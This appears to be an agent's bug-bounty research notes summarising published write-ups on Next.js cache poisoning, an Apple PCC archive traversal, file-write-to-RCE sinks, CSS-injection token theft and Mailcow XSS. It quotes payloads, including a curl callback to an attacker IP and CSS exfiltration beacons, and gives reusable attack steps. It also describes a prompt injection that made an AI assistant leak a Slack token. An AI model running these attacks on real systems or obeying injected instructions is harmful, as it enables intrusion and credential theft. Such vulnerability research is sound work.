Authors state the target was "the website of a globally recognized company providing critical services" and that the bug paid a five-figure bounty; not reported to the Next.js team (it depends on a header-reflection middleware + an external cache).
STATUS: UNVERIFIED (not reproduced) — no Next.js app, middleware or CDN cache was stood up; every request, code line and payload below is the authors' own.
CLASS: CACHE POISONING → STORED XSS (0-click) built on a header-reflection + response Content-Type CONFUSION in the Next.js App Router RSC payload. Recorded as a chain: the reflected query parameter alone is not the finding; the CACHED, framework-typed XSS and the click-free pivot to it are.
CORE METHOD:
  1. Recognise the middleware habit: the application mirrors REQUEST headers back into RESPONSE headers (forwarded through a loop `for (const key of Object.keys(resHeaders)){ res.setHeader(key, resHeaders[key]); }`). On App Router, adding the header `Rsc: 1` makes the server return the React Server Component payload; URL parameters are then systematically reflected into that payload AFTER the `__PAGE__` marker, and because an RSC request's default content-type is `text/x-component` the characters `<` and `>` are NOT escaped. (Dynamic pages only — static RSC payloads are prebuilt and identifiable by the `x-nextjs-prerender` response header.)
  2. Confuse the type: since your request headers become response headers, send `Content-Type: text/html`. Next.js assigns the response content-type only if none is already set (`if (!res.getHeader('Content-Type') && result.contentType) { res.setHeader(...) }`), so your `text/html` survives and the RSC body — carrying your raw `<img src=x onerror=...>` — is served as HTML.
  3. Request shape: `GET /targeted-path?pwn=<img+src=x+onerror=...> HTTP/1.1` with `Host: targeted-site.com`, `Rsc: 1`, `Content-Type: text/html` (the authors' own payload obfuscates the sink as `frames['loca'+'tion']=a+b` and concatenates `'javascript'+':'+'alert'+'('` to slip a young WAF). Because the URL parameter is part of the cache key in their CDN configuration, the poisoned response is cached and reachable at the URL carrying the payload — i.e. a stored XSS via cache poisoning, not a plain reflected one. Note the trap: `Rsc` IS appended to the `Vary` header by Next.js but this cache did not honour `Vary` for content negotiation.
  4. Remove the click (two-stage poison, works on fully-patched versions): (a) poison the target path as in step 3; (b) poison a page the victim will actually visit (e.g. `/`) by sending a `Refresh` response header — `GET / HTTP/1.1` with `Refresh: 0; https://targeted-site.com/targeted-path?pwn=<same payload, byte-identical because it is the cache key>`. The verified header-forwarding loop writes it as a real response header; a visitor to `/` gets a 200 containing `Refresh: 0; ...` and the browser immediately navigates to the cached XSS page. The `Refresh` header is preferred over `Location` because browsers ignore `Location` on non-3xx status codes and the 200 keeps the response cacheable.
  5. The alternative they deliberately dropped: on versions still vulnerable to CVE-2025-57822 (`<14.2.32` and `<15.4.7`, where the `Location` header is processed when request headers are reflected) the same reflection gives a full READ SSRF; they constrained themselves to the `Refresh` variant so the exploit survives a patched/up-to-date target.
DETECTION SIGNAL: a proxy/middleware that copies request headers into response headers — send `Content-Type: text/html` on an RSC/`Accept: text/x-component` request and see whether it sticks in the response; `Rsc: 1` (or `Accept: text/x-component`) returning a `__PAGE__` payload with query parameters reflected unescaped; a CDN in front of an App Router app where `Rsc` sits in `Vary` but the cache still returns one body for both types; dynamic vs static pages separable by `x-nextjs-prerender`; a middleware matcher excluding `_next/static|_next/image|favicon.ico` (the header-forwarding logic usually lives there).
CHAIN: request-header → response-header reflection (primitive: the client controls response headers, including `Content-Type`) -> the RSC payload reflects an unescaped query parameter and the type is overridden to `text/html`, so the framework's own response is cached HTML containing attacker script (escalation: framework-signed HTML, cached) -> a second poison writes a cached `Refresh: 0` on a page the victim will load, pivoting them into the stored XSS with zero clicks (escalation: 0-click stored XSS at site scale; the authors report it landed on a globally recognised company's site for a five-figure bounty). Same reflection reaches full-read SSRF via `Location` on pre-15.4.7 builds.
TRANSFERABLE TEST: on any App Router Next.js app behind a cache, send `GET /<path>?x=<b>x</b>` with `Rsc: 1` and `Content-Type: text/html`; if the body comes back as HTML with your tags and the response is cached, you have the primitive — then send `GET /` with `Refresh: 0; https://<host>/<path>?x=<same>` and re-fetch `/` to confirm the poisoned redirect header is served from cache. Rule: **when a proxy mirrors request headers into response headers you own the response's Content-Type — pair that with any endpoint that reflects a parameter into a body the framework does not treat as HTML (RSC payload, JSON, XML) and any cache in front turns a reflected parameter into stored XSS; add a cached `Refresh: 0` on a page the victim will visit to delete the click.**
DEDUPE: `zhero`, `inzo_`, `stale elixir`, `x-nextjs-prerender`, `Refresh header`, `Vary header` = 0 hits across all three write targets. The 21 `Rsc` / 11 `text/x-component` hits were reviewed and are NOT this technique: they belong to the recorded Next.js Server-Action entry (unauthenticated `Next-Action` invocation with `Accept: text/x-component`, §17.218) and to the generic web-cache-poisoning section — none records the RSC-payload parameter reflection, the request-header Content-Type override, or the cached `Refresh:` 0-click pivot.

SOURCE: https://blog.sentry.security/beyond-prompt-injection-hacking-apples-private-cloud-compute/  2026-11-08
ROUTE: reached from assigned source 1 (Intigriti Bug Bytes #239 — August 2026, "Beyond Prompt Injection: hacking Apple's Private Cloud Compute", Drinor (Sentry)). `web_extract` rendered the FULL body (17,363 chars, 228 lines) — no fallback, no elision. CVE-2026-20685, fixed in "PCC releases 5E290.3 and later"; Apple Security Bounty award $150,000, rated information disclosure CVSS 6.5 `AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`; all work done inside Apple's own Virtual Research Environment (VRE), no production testing. Author Drinor Selmanaj (Founder/CTO, Sentry), published under Sentry's Applied Research Center; images dated 2026/07 — inside the window; read in full 2026-11-08.
STATUS: UNVERIFIED (not reproduced) — no VRE VM was booted and no cryptex was forged; the tar listing, Swift snippets, plist and SSH output below are quoted from the writeup.
CLASS: PATH TRAVERSAL → ARBITRARY FILE WRITE AS ROOT inside a signed-bundle archive extractor (Zip Slip family, CWE-22, the author notes CVE-2007-4559) in a boot-time provisioning process, chained to sensitive telemetry redirection. The traversal class is already recorded (playbook V-10 "path-traversal-testing"); what is NEW here are the extractor-selection and validation-evasion atoms — recorded accordingly (see DEDUPE).
CORE METHOD:
  1. Target the boot window: `darwin-init` is the first userspace process (PID 1, root); it fetches the node's configuration, downloads the cryptexes, extracts/installs them and triggers a userspace reboot — so whatever it leaves on the writable data volume is present before any steady-state protection is running.
  2. Pick the extractor: `darwin-init` reads the FIRST FOUR BYTES to choose. `AEA1` → Apple Encrypted Archive, `AA01` → Apple Archive (both safe), anything else → the generic `extract(to:)`. A tar's `ustar` signature sits at offset 257 — outside the 4-byte window — so a tar ALWAYS falls through to the generic, unvalidated extractor.
  3. The sink (author's Swift): `guard let cStr = archive_entry_pathname(entry); let str = String(cString: cStr); let pathname = path.appending(str); archive_entry_set_pathname(entry, pathname.description)` — the entry name is appended to the output directory with no sanitisation; the options set only `ARCHIVE_EXTRACT_TIME | ARCHIVE_EXTRACT_PERM | ARCHIVE_EXTRACT_ACL | ARCHIVE_EXTRACT_FFLAGS`, i.e. NONE of libarchive's security flags, so it writes wherever the entry name points and returns `ARCHIVE_OK`.
  4. Two missing controls: `PrivateCloudOSValidator.validate(cryptexConfig:)` is an empty function body in the published source, and the per-cryptex `sha256` is OPTIONAL — so an attacker-supplied configuration skips integrity verification entirely.
  5. Depth arithmetic on the extraction base `/var/tmp/darwin-init/cryptex/<UUID>/`: `..`×3 → `/var/tmp/` (erased by the userspace reboot, useless); `..`×4 → `/var/db/` on the writable data volume (PERSISTS) — that is the target.
  6. THE HYBRID ARCHIVE (the reusable trick): a traversal-only tar would write the files and then FAIL the `fullyApplied` check, hanging the boot. So put TWO kinds of entries in ONE tar: (a) traversal entries prefixed `../../../../db/` (a proof file and the log-forwarder config), and (b) a complete, structurally valid cryptex bundle — `Restore/BuildManifest.plist` plus `Restore/Cryptex/POC_DEMO/{gdmg,ginf,gtcd,gtgv}` produced by running Apple's own `pccvre cryptex create` against a throwaway directory and extracting the resulting `.aar`. The traversal entries extract into `/var/db/` first; the `Restore/` subtree lands in the extraction dir where `cryptexctl personalize` validates it; personalization and install succeed, `fullyApplied` passes, USR fires, and the node boots clean.
  7. Escalation — aim the write at a file a daemon watches: the second traversal entry writes `/var/db/prcos/splunkloggingd/config-main.plist`, whose `launchd` `PathState` KeepAlive starts `splunkloggingd` the moment the file exists and points it wherever the file says (`<key>Server</key><string>http://<attacker>:8088</string>`, `Index=exfil`, widened `Predicates`, `Level=Debug`). Within seconds the listener received ~785 KB of CloudBoard daemon state and node telemetry; driving one inference request added per-request `PlaintextMetadata` (`bundleID`, `workloadType`, `requestID`, `automatedDeviceGroup` — fields CloudBoard marks "must not be logged publicly") and Trusted Inference Engine token counts/latency (input tokens tracked prompt length), i.e. inference side channels.
  8. Why it hides: a nonce-controlled clean-vs-poisoned comparison showed `apTicket`, SecureConfig, cryptex metadata, `appData` and (per-boot) Image4 manifests identical, and Apple's own `pccvre attestation verify` treated both bundles identically — attestation measures INSTALLED SOFTWARE, not the writable-volume config a daemon reads at runtime.
DETECTION SIGNAL: any boot/provisioning/agent process that fetches and UNPACKS a signed bundle or archive you can supply (cryptex, app bundle, OS update, container layer); extractor selection keyed on magic bytes where one format (tar/cpio/gz/zip) falls to a generic path; extraction options that omit libarchive's security flags or a hand-rolled `path.appending(entry_name)` with no `..` filter; a validator function that is empty/TODO in the shipped binary; an OPTIONAL integrity field (a digest that may be omitted); a depth-sensitive base where one level is wiped (`/var/tmp`) and the next persists (`/var/db`); a `launchd`/systemd `PathState` watcher on a writable config read at runtime; attestation that covers software but not writable configuration.
CHAIN: magic-byte extractor selection routes a tar (signature at offset 257) to an unsanitised `archive_entry_pathname` sink (primitive: archive entry names are trusted as filesystem paths) -> four `..` reach the persistent data volume and the missing libarchive flags let the write land as ROOT outside the extraction directory (escalation: root arbitrary file write) -> packaging the traversal together with a genuinely valid bundle passes `fullyApplied` so the node boots normally and attestation records no difference (escalation: persistence + undetectability) -> the written file is a config the runtime log forwarder is watching, redirecting CloudBoard and per-request inference metadata marked non-loggable to the attacker (escalation: sensitive inference telemetry disclosure that breaks PCC's privacy guarantee; the vendor's own CVSS stayed 6.5 information-disclosure but the trust-boundary breach drew $150,000). Note for doctrine §8: the standalone verbose/info patient is never reported — here the reportable core is ROOT file write + persistence + attestation bypass, with the telemetry redirect as the demonstrated impact.
TRANSFERABLE TEST: for any archive-unpack sink: (1) build a tar whose entries carry `../`×N and confirm the write escapes the extraction directory; (2) if a post-extraction validator or `fullyApplied`-style success check exists, put a genuinely valid bundle in the SAME archive so the check passes (produce the good payload with the vendor's own packing tool); (3) decide which level persists (wiped tmp vs writable data volume) and aim the write at a file a daemon watches (`PathState`, systemd `.path`, inotify) so a file write becomes a behavioural change. Rule: **an extractor that picks its parser by magic bytes guarantees one format falls to the unvalidated path; an optional integrity field plus an empty validator means the attacker supplies the config; and a traversal exploit must be packaged together with a structurally valid bundle so the extractor's own success check lets it through — then aim the write at a file a service re-reads.**
DEDUPE: `libarchive`, `archive_entry`, `ARCHIVE_EXTRACT`, `darwin-init`, `cryptex`, `splunkloggingd`, `CloudBoard`, `PlaintextMetadata`, `attestation`, `Drinor`, `20685`, `Private Cloud Compute` = 0 hits across all three write targets. The Zip Slip / nested-archive traversal CLASS is already recorded (playbook V-10, "path-traversal-testing", table row "Archive import/extract feature; entry names containing `../` or absolute paths"); this entry does NOT re-record the class — its new atoms are (a) extractor selected by the first four bytes so one archive format always skips validation, (b) libarchive security flags omitted, (c) the HYBRID archive that is simultaneously a traversal exploit and a valid bundle so the process's own `fullyApplied` check passes, (d) the depth arithmetic that separates a wiped tmp from a persistent volume, and (e) a runtime-watched config file (not a binary) as the escalation target. A §17 slot records the new general rule; the traversal class itself stays V-10's.

SOURCE: https://ethiack.com/info-hub/research/write-once-shell-everywhere-arbitrary-file-writes-into-rce  2026-11-08
ROUTE: reached from assigned source 1 (Intigriti Bug Bytes #239 — August 2026, "Getting an arbitrary file write closed as medium? … Write Once, Shell Everywhere"). `web_extract` returned the page but ELIDED its middle ("[... middle omitted ...]" over ~976 chars); the page footer names the complete cached copy (`/root/.hermes/cache/web/ethiack.com-82674e8a42.md`), and the head+tail I dumped (29,834 + 9,842 of 40,652 clean chars → `writeonce.txt`, read in two passes lines 1-800 and 801-1458) covers the paper end-to-end. Written version of the "Write Once, Shell Everywhere" talk at DEF CON 34 (August 2026), Bug Bounty Village Creator Stage, by André Baptista (@0xacb), Rafael Castilho (@Castilho) and Bruno Mendes (@s3np41k1r1t0); inside the window; read in full 2026-11-08.
STATUS: UNVERIFIED (not reproduced) — no target was touched and no payload was written anywhere; the catalog, the errno table, the code snippets and the exploit flows are the paper's own.
CLASS: ARBITRARY FILE WRITE → RCE, escalated by two new-atom ideas: turn the WRITE into a READ ORACLE for fingerprinting, then pick a minimal-guessing, known-executed destination that survives a stripped, distroless container. (The AFW→RCE class is recorded; this entry records the oracle + the cloud-native sinks.)
CORE METHOD:
  1. The formula: RCE = Path control + Content control + a KNOWN-EXECUTED DESTINATION. The third term is the whole game and is what nobody hands you; grade the primitive first (destination control fully-controlled/forced-prefix/fixed; content control; filename control; write mode overwrite/append/create-exclusive — note create-exclusive is a clean EXISTENCE ORACLE, and append is fine for line-terminated targets like shell profiles, `authorized_keys`, `/etc/passwd`, cron, `.user.ini`).
  2. Turn the write into a read: path resolution stops at the first failing component, so the error leaks that component's existence, type and writability. Map errno → verdict: `ENOENT` = a component is missing (NOT EXISTS); `EACCES` = exists, you lack write/search (EXISTS); `EISDIR`/`EEXIST` = the target name exists (EXISTS); `ENOTDIR` = a mid-path component is a regular file (EXISTS-file); `ELOOP` = symlink cycle; `EROFS` = read-only mount; `ENAMETOOLONG` = name exceeds the filesystem limit; success = WRITABLE.
  3. When errno is swallowed (production try/catch), calibrate RESPONSE DIFFERENTIALS instead: probe a known-writable path, a non-existent path and a locked path, record each signature (HTTP status, body length, latency, connection state) — their mapping was 200 = WRITABLE, 404 = ENOENT, 403 = EACCES — then treat every later probe as a lookup against those signatures. The write still executed, so the exception still steered the app down a different, observable code path.
  4. Fingerprint with a layered decision tree of existence probes: `/.dockerenv` (Docker), `/run/.containerenv` (Podman), `/var/run/secrets/kubernetes.io/serviceaccount` (k8s pod), `/mnt/c` or `/var/task` (WSL/Lambda), `/lib/modules` AND `/run/systemd/system` both absent (STRIPPED CONTAINER → stop spending requests on cron/systemd/SSH/login); distro: `/var/lib/dpkg/status`+`/etc/lsb-release` (Debian/Ubuntu), `/lib/ld-musl-x86_64.so.1` (Alpine), `/var/lib/rpm/Packages` vs `/var/lib/rpm/rpmdb.sqlite` (RHEL 8 BDB vs RHEL 9 SQLite); version: probe DIRECTORY NAMES that encode the version — `/usr/lib/python3.12`, `/usr/lib/php/YYYYMMDD` (the Zend API date maps 1:1 to an exact PHP minor), `.venv`/`.rbenv/versions/X.Y.Z` (full patch, decoupled from the base image). Six benign probes produced e.g. "Linux · Ubuntu 24.04 · aarch64 · glibc · stripped Docker · Python 3.12", which tells you which half of the catalog to discard and exactly where site-packages lives.
  5. Minimal-guessing destination #1 — the running shell's own script: bash/dash read their script lazily and relocate the descriptor out of reach (bash → fd 255, dash/sh → fd 10), and for a container ENTRYPOINT the pid is 1. So write the payload to the interpreter's own fd: `echo '\n\n\nid; curl http://<ip>/$(id -u)' > /proc/1/fd/255   # bash` (or `/proc/1/fd/10` for sh/dash) — the leading newlines pad the read cursor like a NOP sled, so you never need to know the script's path or offset. Preconditions: a bash/dash entrypoint, the script is writable, and the write happens while the shell is parked on something (e.g. serving your requests). Worked against a Kubernetes Job whose `/app/run.sh` (PID 1 = sh) contains a file parser carrying the AFW: the parser overwrites `/proc/1/fd/10`, exits, control returns to the entrypoint, and sh reads the next bytes = your command → `uid=0(root)`.
  6. Minimal-guessing destination #2 (Ruby/Rails): `db/schema_cache.yml` is loaded with `YAML.unsafe_load`, so a write becomes a deserialization gadget hunt. Their chain declares a `Gem::Requirement` as a YAML HASH KEY (explicit-key syntax) so Ruby hashes it (calling `#hash`), whose `Lockfile#to_s` asks a malicious `Gem::StubSpecification` for its specification, which calls `Gem::Specification.load("/tmp/payload")` — RubyGems evals that file as Ruby. Two writes (the YAML + the Ruby file); the app errors AFTER the eval, which is the pattern to internalise: an error in the response is not evidence the payload failed.
  7. Minimal-guessing destination #3 (Node): `require` caches modules, so overwriting `node_modules/<mod>/index.js` does nothing to a live process — but WORKERS load from disk on every spawn. Worker-pool libraries resolve the worker entrypoint relative to their OWN `__dirname`, so the path is deterministic from the library layout, not the app: Piscina `/piscina/dist/worker.js`, thread-stream `/thread-stream/lib/worker.js`, Tinypool `/tinypool/dist/entry/worker.js` and `/tinypool/dist/entry/process.js`, jest-worker `/jest-worker/build/threadChild.js` and `/jest-worker/build/processChild.js` (overwrite both files of the last two — mode is configurable). Preconditions: a pool library is used, `node_modules` is writable, and a new worker spawns (load increase, a crash, or the pool's recycle limit — on a busy app just wait).
  8. Other graded sinks (for the catalog): `/etc/ld.so.preload` (fires on EVERY new process; High — needs the `.so` on disk too), `/proc/sys/kernel/core_pattern`/`modprobe`, `/sys/kernel/uevent_helper` (a writable `core_pattern` inside a container is itself a container escape), `*.pth`/`sitecustomize.py` (Python, interpreter start), PHP web-root `*.php`, `.user.ini` (PHP-FPM/CGI only), `.htaccess` (mod_php; `AllowOverride` defaults to None since Apache 2.3.9 — no longer safe to assume), `.NET/IIS` `web.config` / `global.asax` / `bin\*.dll` / `*.aspx` (next request), Ruby `config/initializers/*.rb`/`config/boot.rb` and Bootsnap `tmp/cache/bootsnap` (needs the Ruby version — the oracle gives it), Java `WEB-INF/web.xml`+`classes`/`lib` and `webapps/*.war` (WatchedResource auto-reload ≈10 s when `autoDeploy=true`; pair a `.class` write with a touch of `web.xml` to force a context reload).
DETECTION SIGNAL: any file write with even partial path/content control on a modern (containerised) target; an endpoint whose response varies by status/body/latency depending on the write target (the oracle); a writable `/etc/ld.so.preload`, `node_modules`, a site directory, `tmp/cache/bootsnap`, a web root, an `appBase`/`WEB-INF`, `~/.rbenv/versions`, `/usr/lib/php/*`; a shell-script container entrypoint (PID 1 = sh/bash); a Rails app with a writable `db/`; a Node app with a pool library in `node_modules`.
CHAIN: an arbitrary file write with path+content control (primitive) -> the write is ALSO a path-probe oracle (errno or response differentials) that fingerprints OS, execution context, distro, language and exact version (escalation: guessing replaced by an ordered decision tree, few probes) -> a no-guess destination a process re-reads by itself hands over code execution — the running entrypoint's own `/proc/1/fd/255|10`, a `schema_cache.yml` unsafe-load gadget, or the deterministic worker-pool `worker.js` (escalation: RCE with no reboot, no login, no cron daemon) ⇒ the paper's thesis is exactly doctrine §2(c)/§4: "arbitrary file write is not a medium severity vulnerability" once the target is profiled.
TRANSFERABLE TEST: on any AFW, first calibrate the oracle (three probes: writable, non-existent, locked → map status codes to WRITABLE/NOT EXISTS/EXISTS), then probe `/.dockerenv`, `/var/run/secrets/kubernetes.io/serviceaccount`, `/lib/modules`+`/run/systemd/system` and version-named directories to choose a sink; if the entrypoint is a shell script, write `\n\n\n<cmd>` to `/proc/1/fd/255` (bash) and `/proc/1/fd/10` (sh/dash) and watch for the callback; if Rails, write `db/schema_cache.yml` with the `Gem::Requirement`/`StubSpecification` gadget plus the Ruby payload file; if Node, overwrite the deterministic `worker.js` path of whichever pool library is present and generate load. Rule: **an arbitrary file write is a read primitive as much as a write — profile the target with existence/errno differentials before spending a destructive request, and prefer destinations the machine re-reads on its own: the running entrypoint's own file descriptor, a data file the runtime unsafe-loads, or the next worker the pool spawns — those need no reboot, no login, and no daemon a stripped container has removed.**
DEDUPE: `ld.so.preload`, `schema_cache`, `bootsnap`, `worker.js`, `Piscina`, `core_pattern`, `user.ini`, `errno`, `ENAMETOOLONG`, `ENOTDIR`, `Ethiack`, `Write Once`, `Shell Everywhere`, `StubSpecification`, `0xacb` = 0 hits across all three write targets. Reviewed and NOT re-recorded as new: the `arbitrary file write → RCE` class and the persistence paths it reuses (`Startup` folder, `~/.zshenv`, `authorized_keys` — the Stackfield §17.222 entry and the earlier file-write material), and the Python `.pth`/`sitecustomize` import-time sink (playbook line 10249). NEW here = the write-as-read errno/signature ORACLE, the layered fingerprint decision tree, the `/proc/1/<pid>/fd/255|10` running-script sink, the Rails `schema_cache.yml` unsafe-load gadget, and the deterministic worker-pool `worker.js` paths.

SOURCE: https://portswigger.net/research/css-the-bomb-inside-your-inbox  2026-11-08
ROUTE: reached from assigned source 1 (Intigriti Bug Bytes #239 — August 2026, "CSS: the bomb inside your inbox", @garethheyes). `web_extract` returned an ELIDED body (head+tail; the middle fenced by the tool's own omission marker); the missing middle (Gmail proxy bypass, the Cowork prompt-injection exfil, the Outlook CSS gadget, CSS hotwiring) was recovered from the cached full page `/root/.hermes/cache/web/portswigger.net-74afbb4899.md` (50,072 clean chars) and read — the paper was read end-to-end (introduction → abusing allowed HTML/CSS → sanitizer bypass → exploitation → keylogger). Published Thursday 6 August 2026, updated 13 August 2026; inside the window; read in full 2026-11-08.
STATUS: UNVERIFIED (not reproduced) — no webmail client or lab was stood up; every vector, payload and screenshot description below is the author's own. Two Fastmail CSSOM-mutation bugs each paid $1,000 per the paper.
CLASS: CSS INJECTION rendered in a trusted origin → TOKEN/CREDENTIAL THEFT and click hijack (client-side misconfiguration with demonstrated impact, chained to account takeover). Chain-only: the injection primitive is not the finding; the 12-char login-token theft (ATO), the password keylogger and the Slack-token exfil are.
CORE METHOD:
  1. Detect a sanitizer/browser discrepancy cheaply: paste `<style>*{color:red}</style>` into a draft/compose field as real HTML (the paper uses Hackvertor's "Copy as HTML" to put HTML on the clipboard) and look for a red flash on a `contenteditable` target. Browser behaviour differs and decides your route: Chrome rewrites inline style blocks into style attributes, Safari drops them, FIREFOX keeps inline `style` tags and makes background requests — the best target.
  2. Build an external-request vocabulary to beat the image proxy / CSP: `background:image-set(var(--x,'//attacker'))` (the sanitizer strips the literal URL; the fallback fires because `--x` is undefined), all `image-set`/`-webkit-image-set` and `@import url()/"/'` variants, and the comment vector `<style>/*# sourceMappingURL=https://<you> */</style>`. Also exploit CSS's lax syntax: unclosed parens (`background:0%url(/foo)`), comments inside `url(/*Not a comment*/)`, and HEX ESCAPES between the slashes so a URL looks relative to the sanitizer but is external to the browser — `<div style="background:url(/\5c/user.fm/uid.fastmail.com/track)">` (Fastmail: bypassed the proxy and used an allow-listed CSP domain, visible in Fastmail's own access log) and `url(/\D/evil)`.
  3. Steal a short token with NESTED attribute selectors. Pick the element holding the token (`a[href^="https://medium.com/m/callback/email?token="]`), leak ~5 chars from the start (`&[href*="en=c2e16"]`) and ~5 from the end (`&[href*="a1781&o"]`) plus overlapping "contains anywhere" chunks for the middle, each leaking via `background:url("//evil/?start=…")`. Nesting (`[attr^=…] { &[attr*=…] { … } }`) is what keeps the CSS small enough; store each hit in a short custom property (`--s`, `--e`) and emit one `background:var(--s,none),…,var(--e,none)`. `:not([href*="_e96de"])` filters unrelated chunks. Server-side, slice the known start/end and compare the 5-char chunks to recover the 2 middle characters; works for ANY 12-char hex token (both Yahoo Mail and AOL Mail have the same paste race).
  4. When CSP blocks all external requests (so no `url()` beacons): exfiltrate a numeric code with a FONT-HEIGHT ORACLE — one `@font-face{font-family:has_N;src:local('Courier New');unicode-range:U+003N;descent-override:200%}` per digit, an `@keyframes` that assigns the matching `has_N` family (with an `arial` gap frame so digits are counted correctly), compute the frequency `--c: calc(round((var(--h) - 108) / 28))`, play the right animation per digit via `if(style(--flag:"Zero"): …)`, and reveal the single correct link with `a{inset:max(var(--zero1,100%), …)}` — the matching link is 0% (fullscreen, so a click ANYWHERE in the email exfiltrates) while every other is 100% (offscreen).
  5. Sanitizer bypass by CSS MUTATION (for clients that re-serialise the CSSOM): the browser DECODES escapes when the filter reads properties back. `@keyframes foo\7d\2a { color:red }` is read back as `@keyframes foo } * { color:red }` and `@media s\63\72\65\65\6e\7d\2a\7b\63\6f\6c\6f\72\3a\72\65\64\7d print {…}` mutates via `rule.media.mediaText` (the code pushed `mediaText` with no filtering) — the sanitizer sees a safe keyframe/media name, the browser sees `}*{…}` breaking out. Methodology: Probe → Inspect (devtools) → Transform → Exploit, loop. (Fastmail's fix: skip a media query whose `mediaText` matches anything outside `[A-Za-z0-9:,.()_\-/]`.)
  6. Hijack clicks with pure CSS — "CSS HOTWIRING": `:before`/`:after` INHERIT the element's click events, so `.vip:before{position:fixed;width:100%;height:100%;content:" ";z-index:10000000}` makes a click ANYWHERE trigger the chosen action (the `content` property is mandatory or the pseudo is ignored; `content:" "` keeps it invisible). Stack multi-step actions with increasing `z-index`. Related CONTROL ACTIVATION: `<label for="RibbonModeToggle">` (and `for="<element id>"`) activates any id'd control — the paper pinned an Outlook message to the victim's Outlook this way and Microsoft did not fix it; enumerate targets with `document.querySelectorAll('input[id],button[id],select[id],textarea[id]')`.
  7. Outlook CSS GADGET: the sanitizer allow-lists custom `data-*` attributes, and a library appends DOM nodes using those attribute values with CSS property values (e.g. `position:fixed`) OUTSIDE the allow list — wrap the gadget, override its `content-visibility`/visibility with `!important`, and you break out of the message window and can deface or spoof a login screen. With the gadget plus the adjacent-sibling-combinator bypass of the blocked `:checked`-with-a-class (`option+option:checked{background:url(https://02.rs/?steal=a)}`), a working keylogger survives DOMPurify AND the CSS allow list: fake the field with `select{appearance:none;-webkit-text-security:disc}` and make it REAL TIME with the Firefox quirk that moving the select offscreen resets the ~1 s option-selection timer (`@keyframes focusTrick{from{left:-5000px}to{left:0}}`).
  8. Chain to third-party token theft: the Gmail proxy bypass (`image-set(var(--x,'//02.rs'))`) was combined with INDIRECT PROMPT INJECTION in a Gmail-connected AI assistant (Cowork) — an email framed as a CTF task got the agent to find a Slack token, build an HTML email whose `background:image-set(var(--flag,'//02.rs?flag=SNF-PP6'))` fired on a visit, and draft it — exfiltrating the token.
DETECTION SIGNAL: a webmail/notes/chat client that renders untrusted HTML+CSS in a trusted origin (the paste-HTML red-flash probe / a CSS beacon); an image proxy that base64-encodes your URL into its own path (bypass with `image-set`/var fallback, escaped slashes, `sourceMappingURL`); a filter that re-serialises the CSSOM (mutation: escapes decoded on read-back); allow-listed custom `data-*` attributes whose values a library turns into DOM+CSS (gadget); `:before/:after`/`label[for]` reachable from message HTML; a short hex token in a URL or a numeric code in a text node that a `contenteditable` draft can see.
CHAIN: untrusted CSS renders in the trusted webmail origin (primitive) -> nested attribute selectors + `background:url()` beacons leak a 12-char login token 5 + 2 + 5 chars at a time, or a font-height oracle + `inset:max(…)` leaks a numeric code on a single click anywhere (escalation: the attacker holds the token/code) -> the paste into a `contenteditable` draft steals it with no prompt (the Medium email-login 12-hex flow) ⇒ LOG IN AS THE VICTIM (account takeover); separately the Outlook CSS gadget + DOMPurify-surviving keylogger harvests credentials on a spoofed sign-in screen (escalation: credential theft), and the Gmail `image-set` proxy bypass chained with indirect prompt injection exfiltrates a Slack token out of an AI assistant's draft (third-party token theft). Author's corrective note: existing "ends-with attribute selector" CSS keyloggers do NOT work without an attribute↔DOM-property binding; theirs works because `<select>`/`<option>` state does bind.
TRANSFERABLE TEST: on any app that renders your HTML/CSS in its own origin: paste `<style>*{color:red}</style>` via "copy as HTML" to see whether CSS survives; then (a) try external requests through `image-set(var(--x,'//you'))`, a `/*# sourceMappingURL=//you */` CSS comment, and `url(/\5c/<host>/…)` to bypass the image proxy; (b) for a short hex token in the DOM, nest `[attr^="prefix"]` + `[attr*="…"]` rules to leak 5 + 5 chars around it; (c) for a numeric code, build the `unicode-range` font roll-up plus the `inset:max(…)` click-to-exfil link; (d) re-serialisation test: feed `@keyframes x\7d\2a{color:red}` and read the rendered/serialised CSS to see whether it mutated; (e) `.anyUIaction:before{position:fixed;width:100%;height:100%;content:" ";z-index:9999999}` to hijack clicks, and `<label for="<id>">` to activate controls. Rule: **wherever untrusted CSS is rendered in a trusted origin the always-available impacts are (a) leaking any short token in an attribute or text node via nested attribute selectors / a font-height oracle, (b) hijacking clicks with `:before/:after` (they inherit the element's handlers) and `label[for]`, and (c) reading back MUTATED CSS — so always test the sanitizer by mutation (escapes decoded on re-serialisation) and never trust an image proxy that just base64s your URL.**
DEDUPE: `CSS hotwiring`, `hotwiring`, `attribute selector`, `font-height`, `descent-override`, `unicode-range`, `image-set`, `CSS gadget`, `defanged`, `CSSOM`, `keylogger`, `Gareth Heyes`, `label for=` = 0 hits across all three write targets. Reviewed and NOT re-recorded as new: `sourceMappingURL` (10/0 hits) is recorded only as SOURCE-MAP LEAKAGE (fetching `.js.map` / reading `sourcesContent`), a different surface from using a CSS comment as an external-request beacon to bypass a filter; `opener`/`X-Real-IP` hits are unrelated header material; `cache poisoning` hits are the generic section bought in the Re:CACHE entry above (this paper's contribution there is nil). NEW = the whole untrusted-CSS-in-a-trusted-origin family: nested attribute-selector token brute-force, the font-height oracle + `inset` click-exfil, CSS hotwiring and `label[for]` activation, the CSS gadget, and CSSOM escape-decoding mutation as a sanitizer bypass.

SOURCE: https://www.aikido.dev/blog/xss-vulnerabilities-in-mailcow  2026-11-08
ROUTE: reached from assigned source 1 (Intigriti Bug Bytes #239 — August 2026, "Multiple XSS vulnerabilities in Mailcow", @J0R1AN / Aikido). `web_extract` rendered the FULL body (16,541 chars, 249 lines) — no fallback, no elision. Published 17 Apr 2026 (updated 6 Jun 2026); fixed in mailcow 2026-03b, released 31 Mar 2026; CVSS v4.0 8.9/8.9/7.0 for CVE-2026-40872/40873/40875. ~7 months old, inside the window; read in full 2026-11-08.
STATUS: UNVERIFIED (not reproduced) — no Mailcow instance was stood up; the requests, Python snippet and exploit flow are the article's own.
CLASS: STORED XSS in an admin surface (unauthenticated injection into a page only an admin views) + a SELF-XSS escalated by LOGIN CSRF and a `window.opener` cross-tab read — recorded as chains: the escaped/unescaped column and the self-XSS alone are not findings; the admin-session compromise and the victim's mailbox theft are.
CORE METHOD:
  1. Find the sink: an admin screen that renders server data through JS string concatenation into the DOM. Here the Autodiscover log table is built by DataTables, which "interprets any data values as HTML by default" — so every column must be escaped by hand, and one is not: `item.ua` is passed through `escapeHtml` but `item.name` (the email address) is not.
